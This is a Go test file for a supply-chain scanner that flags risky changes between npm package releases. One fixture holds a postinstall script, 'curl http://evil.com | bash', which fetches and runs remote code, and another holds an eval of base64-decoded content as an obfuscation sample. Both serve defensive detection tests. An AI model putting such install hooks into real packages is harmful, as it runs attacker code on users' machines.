package diff

import (
	"testing"

	"github.com/chainrecon/chainrecon/internal/model"
)

func TestAnalyze_NoFindings(t *testing.T) {
	d := &model.ReleaseDiff{
		Package:    "safe-pkg",
		OldVersion: "1.0.0",
		NewVersion: "1.0.1",
		OldPackageJSON: map[string]any{
			"name": "safe-pkg",
		},
		NewPackageJSON: map[string]any{
			"name": "safe-pkg",
		},
	}

	result := Analyze(d)
	if len(result.Findings) != 0 {
		t.Errorf("expected no findings, got %d", len(result.Findings))
		for _, f := range result.Findings {
			t.Logf("  %s: %s (%s)", f.Severity, f.Message, f.Signal)
		}
	}
}

func TestAnalyze_DetectsPostinstall(t *testing.T) {
	d := &model.ReleaseDiff{
		Package:    "evil-pkg",
		OldVersion: "1.0.0",
		NewVersion: "1.0.1",
		OldPackageJSON: map[string]any{
			"name": "evil-pkg",
		},
		NewPackageJSON: map[string]any{
			"name": "evil-pkg",
			"scripts": map[string]any{
				"postinstall": "curl http://evil.com | bash",
			},
		},
	}

	result := Analyze(d)
	if len(result.Findings) == 0 {
		t.Fatal("expected findings for new postinstall script")
	}

	found := false
	for _, f := range result.Findings {
		if f.Signal == "lifecycle_script" && f.Severity == model.SeverityCritical {
			found = true
			break
		}
	}
	if !found {
		t.Error("expected CRITICAL lifecycle_script finding")
	}
}

func TestAnalyze_DetectsNewDependency(t *testing.T) {
	d := &model.ReleaseDiff{
		Package:    "dep-pkg",
		OldVersion: "1.0.0",
		NewVersion: "1.0.1",
		OldPackageJSON: map[string]any{
			"name":         "dep-pkg",
			"dependencies": map[string]any{},
		},
		NewPackageJSON: map[string]any{
			"name": "dep-pkg",
			"dependencies": map[string]any{
				"malicious-pkg": "^1.0.0",
			},
		},
	}

	result := Analyze(d)
	found := false
	for _, f := range result.Findings {
		if f.Signal == "dependency_injection" {
			found = true
			break
		}
	}
	if !found {
		t.Error("expected dependency_injection finding")
	}
}

func TestAnalyze_DetectsObfuscation(t *testing.T) {
	d := &model.ReleaseDiff{
		Package:    "obfus-pkg",
		OldVersion: "1.0.0",
		NewVersion: "1.0.1",
		Added: []model.FileDiff{
			{
				Path:       "payload.js",
				Status:     model.DiffAdded,
				NewContent: []byte(`var x = eval(Buffer.from("aGVsbG8=", "base64").toString());`),
			},
		},
	}

	result := Analyze(d)
	if len(result.Findings) == 0 {
		t.Fatal("expected obfuscation findings")
	}
}

func TestAnalyze_SortedBySeverity(t *testing.T) {
	d := &model.ReleaseDiff{
		Package:    "mixed-pkg",
		OldVersion: "1.0.0",
		NewVersion: "1.0.1",
		OldPackageJSON: map[string]any{
			"name": "mixed-pkg",
		},
		NewPackageJSON: map[string]any{
			"name": "mixed-pkg",
			"scripts": map[string]any{
				"postinstall": "node setup.js",
			},
			"devDependencies": map[string]any{
				"new-dev-dep": "^1.0.0",
			},
		},
	}

	result := Analyze(d)
	if len(result.Findings) < 2 {
		t.Fatalf("expected at least 2 findings, got %d", len(result.Findings))
	}

	// Verify findings are sorted by severity (most severe first).
	order := map[model.Severity]int{
		model.SeverityCritical: 0,
		model.SeverityHigh:     1,
		model.SeverityMedium:   2,
		model.SeverityLow:      3,
		model.SeverityInfo:     4,
	}
	for i := 1; i < len(result.Findings); i++ {
		if order[result.Findings[i].Severity] < order[result.Findings[i-1].Severity] {
			t.Errorf("findings not sorted: [%d] %s before [%d] %s",
				i-1, result.Findings[i-1].Severity, i, result.Findings[i].Severity)
		}
	}
}
